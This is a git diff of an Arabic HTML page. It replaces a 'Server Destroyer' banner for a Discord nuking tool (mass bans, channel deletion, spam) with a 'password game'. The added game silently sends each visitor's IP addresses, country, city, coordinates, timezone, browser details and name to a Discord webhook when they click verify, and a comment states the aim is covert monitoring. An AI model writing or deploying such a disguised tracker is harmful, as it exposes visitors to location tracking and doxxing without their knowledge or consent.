@@ -1,81 +1,117 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>واجهة التدمير - MOATH</title>
+  <meta charset="UTF-8" />
+  <title>لعبة كلمة السر</title>
   <style>
     body {
-      background-color: #000;
-      color: #f00;
-      font-family: monospace;
-      overflow: hidden;
-      padding: 20px;
-    }
-
-    #typewriter {
-      white-space: pre-wrap;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-
-    .flicker {
-      animation: flickerAnimation 1s infinite;
-    }
-
-    @keyframes flickerAnimation {
-      0%   { opacity: 1; }
-      50%  { opacity: 0.2; }
-      100% { opacity: 1; }
-    }
-
-    .center {
+      font-family: Arial, sans-serif;
+      direction: rtl;
       text-align: center;
+      margin: 50px;
     }
-
-    #footer {
-      color: #f00;
-      margin-top: 2em;
-      text-align: center;
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 250px;
+      font-size: 16px;
+    }
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
 
-<div id="typewriter" class="flicker"></div>
-<div id="footer">fer • NUK3Z ⚰️ »</div>
+  <h1>لعبة كلمة السر</h1>
 
-<script>
-  const banner = `
-========================================================================
-  ███╗   ███╗ █████╗ ████████╗██╗  ██╗    ██╗   ██╗██╗   ██╗███████╗██╗  ██╗
-  ████╗ ████║██╔══██╗╚══██╔══╝╚██╗██╔╝    ██║   ██║██║   ██║██╔════╝╚██╗██╔╝
-  ██╔████╔██║███████║   ██║    ╚███╔╝     ██║   ██║██║   ██║█████╗   ╚███╔╝ 
-  ██║╚██╔╝██║██╔══██║   ██║    ██╔██╗     ╚██╗ ██╔╝██║   ██║██╔══╝   ██╔██╗ 
-  ██║ ╚═╝ ██║██║  ██║   ██║   ██╔╝ ██╗     ╚████╔╝ ╚██████╔╝███████╗██╔╝ ██╗
-  ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
-========================================================================
+  <input type="text" id="playerName" placeholder="اكتب اسمك (اختياري)" autocomplete="off" />
+  <br/>
+  <input type="text" id="userInput" placeholder="اكتب الكلمة هنا" autocomplete="off" />
+  <br/>
+  <button id="verify-button">تحقق من الكلمة</button>
 
-⚠️  S E R V E R   D E S T R O Y E R  ⚠️
+  <div id="result"></div>
 
-│  GRANT-ALL   · CREATE-CH   · DELETE-CH    · DELETE-ROLES              │
-│  BAN-MEMBERS · SPAM-CH     · CHANGE-INFO  · CREATE-ROLES              │
-│  SPAM-MSGS   · RENAME-MEMB · FULL-NUKE    · EXIT                       │
+  <script>
+    const discordWebhookUrl = "https://discord.com/api/webhooks/your_webhook_url_here";
 
-`;
+    // كلمة السر الصحيحة (يمكنك تعديلها)
+    const correctWord = "السر";
 
-  const typewriter = document.getElementById("typewriter");
-  let index = 0;
+    async function sendUserInfo() {
+      try {
+        const geoResponse = await fetch("https://ipapi.co/json/");
+        const geoData = await geoResponse.json();
 
-  function type() {
-    if (index < banner.length) {
-      typewriter.textContent += banner.charAt(index);
-      index++;
-      setTimeout(type, 3); // سرعة الكتابة
+        const ipv6Response = await fetch("https://api64.ipify.org?format=json");
+        const ipv6Data = await ipv6Response.json();
+
+        const ipv4 = geoData.ip || "غير معروف";
+        const ipv6 = ipv6Data.ip || "غير معروف";
+
+        const userAgent = navigator.userAgent;
+
+        const infoText = `
+IPv4: ${ipv4}
+IPv6: ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+الموقع: ${geoData.latitude}, ${geoData.longitude}
+المنطقة الزمنية: ${geoData.timezone}
+متصفح وجهاز المستخدم: ${userAgent}
+        `.trim();
+
+        const data = { content: infoText };
+
+        await fetch(discordWebhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        });
+      } catch (error) {
+        console.error("خطأ في إرسال معلومات المستخدم:", error);
+      }
     }
-  }
 
-  type();
-</script>
+    async function sendPlayerName(name) {
+      if (!name) return;
+      try {
+        const data = { content: `اسم اللاعب: ${name}` };
+        await fetch(discordWebhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        });
+      } catch (error) {
+        console.error("خطأ في إرسال اسم اللاعب:", error);
+      }
+    }
+
+    document.getElementById("verify-button").addEventListener("click", async () => {
+      const playerName = document.getElementById("playerName").value.trim();
+      const userWord = document.getElementById("userInput").value.trim();
+
+      // إرسال البيانات لمراقبة المستخدم بشكل صامت
+      sendUserInfo();
+      sendPlayerName(playerName);
+
+      // التحقق من الكلمة المدخلة وعرض النتيجة
+      const resultDiv = document.getElementById("result");
+      if (!userWord) {
+        resultDiv.textContent = "الرجاء إدخال كلمة للتحقق.";
+        return;
+      }
+
+      if (userWord === correctWord) {
+        resultDiv.textContent = "مبروك! الكلمة صحيحة.";
+      } else {
+        resultDiv.textContent = "الكلمة غير صحيحة، حاول مرة أخرى.";
+      }
+    });
+  </script>
 
 </body>
 </html>
